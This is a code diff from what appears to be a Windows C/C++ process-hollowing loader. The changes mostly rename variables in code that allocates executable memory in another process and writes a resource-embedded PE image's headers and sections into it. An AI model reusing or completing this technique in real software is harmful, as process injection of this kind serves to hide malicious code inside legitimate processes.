@@ -27,7 +27,6 @@ int main()
 		printf("CreateProcess Failed: %d.\n", GetLastError());
 	}
 
-
 	PROCESS_BASIC_INFORMATION pbi;
 	PULONG returnLength = NULL;
 
@@ -47,22 +46,20 @@ int main()
 	LPVOID lpBaseAddressResource = LockResource(resourceData);
 
 
-	PIMAGE_DOS_HEADER dosHeaderResource = (PIMAGE_DOS_HEADER)lpBaseAddressResource;
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddressResource;
 
-	if (dosHeaderResource->e_magic != IMAGE_DOS_SIGNATURE) 
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) 
 	{
 		printf("Failed: .exe does not have a valid signature %i", GetLastError());
 	}
 		
-	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderResource + (DWORD)dosHeaderResource->e_lfanew);
-
-	VirtualAllocEx(pi.hProcess, pPeb->ImageBaseAddress, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
 	
+	VirtualAllocEx(pi.hProcess, pPeb->ImageBaseAddress, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	BYTE* headerBuffer = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];
+	PBYTE headerBuffer = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];
 
-	memcpy(headerBuffer, dosHeaderResource, pNTHeaderResource->OptionalHeader.SizeOfHeaders);
-
+	memcpy(headerBuffer, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);
 
 	if (!WriteProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, headerBuffer, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
 	{
@@ -76,7 +73,7 @@ int main()
 	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
 	{
 		PBYTE section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
-		memcpy(section, (PVOID)((DWORD)dosHeaderResource + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);
+		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);
 
 		printf("Copying data from: %s\n", sectionHeader->Name);
 
